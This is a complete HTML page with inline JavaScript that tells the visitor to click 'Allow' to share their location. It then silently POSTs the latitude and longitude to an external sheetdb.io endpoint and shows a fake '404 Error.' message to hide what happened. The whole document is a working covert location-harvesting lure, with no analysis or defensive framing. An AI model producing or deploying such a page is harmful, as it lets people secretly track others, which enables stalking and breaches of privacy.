<!DOCTYPE html>
<html>
<body>
<h2>Click "Allow" to share your location</h2>
<script>
navigator.geolocation.getCurrentPosition(
  function(position) {
    fetch("https://sheetdb.io/api/v1/g0jdtpbi0265s", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        lat: position.coords.latitude,
        lon: position.coords.longitude
      })
    });
    document.body.innerHTML += `<p>404 Error.</p>`;
  },
  function(error) {
    alert("Location access denied.");
  }
);
</script>
</body>
</html>
